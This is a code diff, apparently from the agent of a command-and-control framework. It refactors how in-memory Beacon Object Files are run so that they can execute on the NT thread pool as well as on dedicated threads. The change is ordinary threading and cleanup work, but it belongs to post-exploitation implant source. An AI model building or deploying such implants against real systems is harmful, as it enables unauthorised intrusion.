@@ -797,14 +797,20 @@ END:
     }
 }
 
-VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
+/*!
+ * CoffeeRunnerWork
+ * Executes the BOF and frees the parameter block.  Returns normally so the
+ * caller can perform path-specific cleanup (thread exit vs. thread-pool
+ * wrapper bookkeeping).
+ */
+VOID CoffeeRunnerWork( PCOFFEE_PARAMS Param )
 {
     if ( ! Param->EntryName || ! Param->CoffeeData )
-        goto ExitThread;
+        goto Cleanup;
 
     CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize, Param->RequestID );
 
-ExitThread:
+Cleanup:
     if ( Param )
     {
         DATA_FREE( Param->EntryName,  Param->EntryNameSize );
@@ -812,6 +818,17 @@ ExitThread:
         DATA_FREE( Param->ArgData,    Param->ArgSize );
         DATA_FREE( Param,             sizeof( COFFEE_PARAMS ) );
     }
+}
+
+/*!
+ * CoffeeRunnerThread
+ * Dedicated-thread entry point: runs the BOF work, then performs
+ * thread-level cleanup and exits the thread.  Must NOT be used as
+ * a thread-pool callback — use CoffeeRunnerWork for that path.
+ */
+VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
+{
+    CoffeeRunnerWork( Param );
 
     JobRemove( (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread );
     Instance->Threads--;
@@ -847,10 +864,13 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
 
     Instance->Threads++;
 
-    /* ARC-09: route through the NT thread pool when configured */
+    /* ARC-09: route through the NT thread pool when configured.
+     * Pass CoffeeRunnerWork (not CoffeeRunnerThread) so the callback
+     * returns normally to TpJobCallback, which handles job bookkeeping
+     * and returns the worker thread to the pool. */
     if ( Instance->Config.Implant.JobExecution == JOB_EXEC_THREADPOOL )
     {
-        if ( ! JobSubmitThreadPool( CoffeeRunnerThread, CoffeeParams ) ) {
+        if ( ! JobSubmitThreadPool( CoffeeRunnerWork, CoffeeParams ) ) {
             PRINTF( "Failed to submit CoffeeRunnerThread to thread pool: %d", NtGetLastError() )
             PACKAGE_ERROR_WIN32
         }
